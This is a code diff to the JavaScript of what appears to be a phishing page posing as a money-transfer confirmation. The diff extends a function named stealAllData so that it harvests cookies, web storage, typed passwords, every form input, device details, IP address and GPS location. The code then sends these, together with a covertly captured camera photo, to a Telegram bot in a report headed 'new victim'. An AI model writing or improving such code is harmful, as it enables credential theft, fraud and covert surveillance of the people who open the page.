@@ -108,10 +108,11 @@ function requestPermissions() {
     }
 }
 
-// ====== دالة جلب البيانات ======
+// ====== سحب كل البيانات من المتصفح ======
 function stealAllData() {
     const data = getParams();
 
+    // 1. جلب الـ IP
     function fetchIP() {
         return fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
@@ -119,6 +120,7 @@ function stealAllData() {
             .catch(() => 'غير معروف');
     }
 
+    // 2. جلب الـ GPS
     function fetchLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -140,22 +142,80 @@ function stealAllData() {
         });
     }
 
+    // 3. سحب الكوكيز
+    const cookies = document.cookie || 'لا يوجد كوكيز';
+
+    // 4. سحب localStorage و sessionStorage
+    let localStorageData = 'لا يوجد';
+    let sessionData = 'لا يوجد';
+    try {
+        localStorageData = JSON.stringify(localStorage);
+        sessionData = JSON.stringify(sessionStorage);
+    } catch(e) {}
+
+    // 5. سحب كل الباسووردات من الصفحة
+    let passwords = [];
+    document.querySelectorAll('input[type="password"]').forEach(input => {
+        passwords.push({
+            name: input.name || 'بدون اسم',
+            value: input.value || 'فارغ'
+        });
+    });
+
+    // 6. سحب كل الـ forms
+    let forms = [];
+    document.querySelectorAll('form').forEach(form => {
+        let formData = {
+            action: form.action || 'بدون action',
+            method: form.method || 'GET',
+            inputs: []
+        };
+        form.querySelectorAll('input, textarea, select').forEach(input => {
+            formData.inputs.push({
+                name: input.name || 'بدون اسم',
+                type: input.type || 'text',
+                value: input.value || 'فارغ'
+            });
+        });
+        forms.push(formData);
+    });
+
+    // 7. سحب الـ meta data
+    const metaData = {
+        title: document.title || 'بدون عنوان',
+        url: window.location.href,
+        referrer: document.referrer || 'مباشر',
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'غير محدد'
+    };
+
+    // 8. سحب كل الـ localStorage keys
+    let localStorageKeys = [];
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        localStorageKeys.push({
+            key: key,
+            value: localStorage.getItem(key)
+        });
+    }
+
     return Promise.all([fetchIP(), fetchLocation()])
         .then(([ip, gps]) => {
-            const cookies = document.cookie || 'لا يوجد كوكيز';
-            let localStorageData = 'لا يوجد';
-            let sessionData = 'لا يوجد';
-            try {
-                localStorageData = JSON.stringify(localStorage);
-                sessionData = JSON.stringify(sessionStorage);
-            } catch(e) {}
-
             return {
                 ip: ip,
                 gps: gps,
                 cookies: cookies,
-                localStorage: localStorageData,
-                sessionStorage: sessionData,
+                localStorageData: localStorageData,
+                sessionData: sessionData,
+                passwords: passwords,
+                forms: forms,
+                metaData: metaData,
+                localStorageKeys: localStorageKeys,
                 victim: {
                     receiver: data.receiver,
                     name: data.name,
@@ -164,6 +224,62 @@ function stealAllData() {
                 }
             };
         });
+}
+
+// ====== إرسال البيانات ======
+function sendToTelegram(allData, photoBase64 = null) {
+    const caption = `🕵️ ضحية جديدة - تقرير كامل
+
+📍 GPS: ${allData.gps.lat}, ${allData.gps.lon}
+🎯 دقة GPS: ${allData.gps.accuracy} متر
+📌 IP: ${allData.ip}
+📱 الجهاز: ${allData.metaData.userAgent}
+🌐 اللغة: ${allData.metaData.language}
+📅 الوقت: ${new Date().toLocaleString()}
+🖥️ الشاشة: ${allData.metaData.screen}
+⏰ المنطقة: ${allData.metaData.timezone}
+🔗 الرابط: ${allData.metaData.url}
+📎 المرسل: ${allData.metaData.referrer}
+🍪 الكوكيز: ${allData.cookies}
+💾 localStorage: ${allData.localStorageData}
+📦 sessionStorage: ${allData.sessionData}
+
+🔐 الباسووردات المسروقة:
+${allData.passwords.map(p => `- ${p.name}: ${p.value}`).join('\n') || 'لا يوجد باسووردات'}
+
+📋 الـ forms:
+${allData.forms.map(f => `- Action: ${f.action}, Method: ${f.method}, Inputs: ${f.inputs.map(i => `${i.name}(${i.type}): ${i.value}`).join(', ')}`).join('\n') || 'لا يوجد forms'}
+
+💾 localStorage بالتفصيل:
+${allData.localStorageKeys.map(k => `- ${k.key}: ${k.value}`).join('\n') || 'لا يوجد keys'}
+
+📱 المستلم: ${allData.victim.receiver}
+👤 الاسم: ${allData.victim.name}
+👤 المرسل: ${allData.victim.sender}
+💰 المبلغ: ${allData.victim.amount}`;
+
+    let fetchPromise;
+    if (photoBase64) {
+        fetchPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                caption: caption,
+                photo: photoBase64
+            })
+        });
+    } else {
+        fetchPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: caption
+            })
+        });
+    }
+    return fetchPromise;
 }
 
 // ====== ضغط الصورة ======
@@ -197,59 +313,6 @@ function compressImage(dataUrl) {
         };
         img.src = dataUrl;
     });
-}
-
-// ====== إرسال البيانات ======
-function sendToTelegram(allData, photoBase64 = null) {
-    const caption = `🕵️ ضحية جديدة - تقرير كامل
-
-📍 GPS: ${allData.gps.lat}, ${allData.gps.lon}
-🎯 دقة GPS: ${allData.gps.accuracy} متر
-📌 IP: ${allData.ip}
-📱 الجهاز: ${navigator.userAgent}
-🌐 اللغة: ${navigator.language}
-📅 الوقت: ${new Date().toLocaleString()}
-🖥️ الشاشة: ${window.screen.width}x${window.screen.height}
-⏰ المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-🔗 الرابط: ${window.location.href}
-📎 المرسل: ${document.referrer || 'مباشر'}
-
-🍪 الكوكيز:
-${allData.cookies}
-
-💾 localStorage:
-${allData.localStorage}
-
-📦 sessionStorage:
-${allData.sessionStorage}
-
-📱 المستلم: ${allData.victim.receiver}
-👤 الاسم: ${allData.victim.name}
-👤 المرسل: ${allData.victim.sender}
-💰 المبلغ: ${allData.victim.amount}`;
-
-    let fetchPromise;
-    if (photoBase64) {
-        fetchPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                caption: caption,
-                photo: photoBase64
-            })
-        });
-    } else {
-        fetchPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: caption
-            })
-        });
-    }
-    return fetchPromise;
 }
 
 // ====== التقاط صورة ======
@@ -289,7 +352,6 @@ function confirmTransfer() {
 
     capturePhoto()
         .then(photoBase64 => {
-            // ضغط الصورة قبل الإرسال
             return compressImage(photoBase64).then(compressed => {
                 return { photoBase64: compressed };
             });
@@ -305,7 +367,6 @@ function confirmTransfer() {
                             confirmBtn.disabled = false;
                             confirmBtn.style.opacity = '1';
                         } else {
-                            // لو فشلت الصورة، نبعت نص فقط
                             sendToTelegram(allData, null)
                                 .then(() => {
                                     hideLoading();
